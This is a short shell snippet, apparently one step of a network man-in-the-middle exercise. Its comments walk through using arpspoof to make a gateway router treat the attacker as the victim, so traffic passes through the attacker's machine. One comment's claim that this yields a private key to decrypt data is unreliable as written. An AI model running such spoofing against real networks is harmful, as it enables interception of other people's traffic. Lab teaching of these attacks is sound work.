# in a new (fourth) terminal
# trick the gateway router into thinking that you are the victim.
# you will have the private key to decrypt data, and the data is forwarded to the victim.
# requires the results from nmap in forward_table.sh to run
arpspoof -i eth0 -t <Gateway IP> <Victim IP>
